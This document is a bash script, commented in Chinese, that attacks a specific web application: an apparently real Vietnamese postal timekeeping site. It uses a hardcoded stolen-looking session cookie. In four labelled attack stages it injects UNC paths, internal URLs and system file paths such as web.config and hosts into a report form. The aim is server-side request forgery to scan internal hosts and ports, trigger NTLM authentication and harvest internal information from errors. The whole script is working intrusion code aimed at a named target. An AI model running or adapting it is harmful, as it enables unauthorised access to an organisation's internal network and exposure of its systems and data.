#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 新思路：通过Chamcong打内网"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击1] SSRF扫描内网 - UNC路径（NTLM Relay）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  策略: 让服务器访问内网IP，探测存活主机"
echo ""

# 常见内网网段
INTERNAL_IPS=(
    "127.0.0.1"
    "localhost"
    "192.168.1.1"
    "192.168.0.1"
    "10.0.0.1"
    "172.16.0.1"
    "192.168.1.100"
    "192.168.1.10"
)

for ip in "${INTERNAL_IPS[@]}"; do
    echo "  测试内网IP: $ip"
    
    # UNC路径（Windows SMB）
    start_time=$(date +%s%3N)
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=//${ip}/share/test" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        --max-time 5 \
        -o "ssrf_${ip//\./_}.html" 2>&1
    
    end_time=$(date +%s%3N)
    elapsed=$((end_time - start_time))
    size=$(wc -c < "ssrf_${ip//\./_}.html" 2>/dev/null || echo 0)
    
    echo "    响应时间: ${elapsed}ms, 大小: $size bytes"
    
    # 分析响应
    if grep -qi "access.*denied\|permission\|unauthorized" "ssrf_${ip//\./_}.html"; then
        echo "    🔥🔥🔥 主机存活！（拒绝访问）"
    elif grep -qi "network.*unreachable\|host.*not found\|timeout" "ssrf_${ip//\./_}.html"; then
        echo "    ❌ 主机不可达"
    elif [ $elapsed -gt 3000 ]; then
        echo "    ⚠️  超时（可能存在防火墙）"
    elif [ $size -ne 7958 ]; then
        echo "    🔥 响应异常！可能有交互！"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击2] HTTP SSRF扫描内网服务"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 常见内网服务端口
INTERNAL_SERVICES=(
    "http://127.0.0.1:80"
    "http://127.0.0.1:8080"
    "http://127.0.0.1:3306"      # MySQL
    "http://127.0.0.1:1433"      # SQL Server
    "http://127.0.0.1:3389"      # RDP
    "http://127.0.0.1:445"       # SMB
    "http://192.168.1.1:80"
    "http://192.168.1.100:80"
    "http://10.0.0.1:80"
)

echo "  测试内网HTTP服务..."
echo ""

for service in "${INTERNAL_SERVICES[@]}"; do
    echo "  测试: $service"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${service}/test" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        --max-time 5 \
        -o "ssrf_service_$(echo $service | md5sum | cut -d' ' -f1).html" 2>&1
    
    size=$(wc -c < "ssrf_service_$(echo $service | md5sum | cut -d' ' -f1).html")
    
    if [ $size -ne 7958 ]; then
        echo "    🔥 响应异常: $size bytes（可能有服务）"
        
        # 检查响应内容
        if grep -qi "IIS\|Apache\|nginx\|tomcat\|login" "ssrf_service_$(echo $service | md5sum | cut -d' ' -f1).html"; then
            echo "    🔥🔥🔥 发现Web服务！"
            grep -i "server\|title" "ssrf_service_$(echo $service | md5sum | cut -d' ' -f1).html" | head -5
        fi
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击3] 通过错误信息探测内网"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  策略: 利用详细错误信息获取内网信息"
echo ""

# 尝试各种内网路径
INTERNAL_PATHS=(
    "C:/Windows/System32/drivers/etc/hosts"
    "C:/inetpub/wwwroot/web.config"
    "C:/Program Files/Microsoft SQL Server/"
    "//DC/sysvol"
    "//FILESERVER/share"
)

for path in "${INTERNAL_PATHS[@]}"; do
    echo "  尝试: $path"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${path}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "path_test_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1
    
    # 查找有价值的错误信息
    if grep -oE "(\\\\\\\\[A-Za-z0-9-]+|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" \
        "path_test_$(echo $path | md5sum | cut -d' ' -f1).html" | head -5 | while read info; do
        echo "    🔥 发现信息: $info"
    done
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击4] 通过Print功能探测（可能不同实现）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  测试Print功能的SSRF..."
echo ""

for ip in "127.0.0.1" "192.168.1.1" "10.0.0.1"; do
    echo "  Print SSRF: $ip"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=http://${ip}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnIn=In" \
        --max-time 5 \
        -o "print_ssrf_${ip//\./_}.html" 2>&1
    
    size=$(wc -c < "print_ssrf_${ip//\./_}.html")
    echo "    响应: $size bytes"
    
    if [ $size -ne 4300 ]; then
        echo "    🔥 响应异常！"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ SSRF内网探测完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 总结发现
echo ""
echo "📊 内网探测总结:"
echo ""

echo "  存活主机:"
grep -l "access.*denied\|permission" ssrf_*.html 2>/dev/null | while read file; do
    echo "    🔥 $(basename $file)"
done

echo ""
echo "  发现服务:"
grep -l "IIS\|Apache\|nginx\|login\|tomcat" ssrf_service_*.html 2>/dev/null | while read file; do
    echo "    🔥 $(basename $file)"
done

echo ""
echo "  异常响应（可能有交互）:"
for file in ssrf_*.html print_ssrf_*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        if [ $size -ne 7958 ] && [ $size -ne 4300 ]; then
            echo "    ⚠️  $file: $size bytes"
        fi
    fi
done
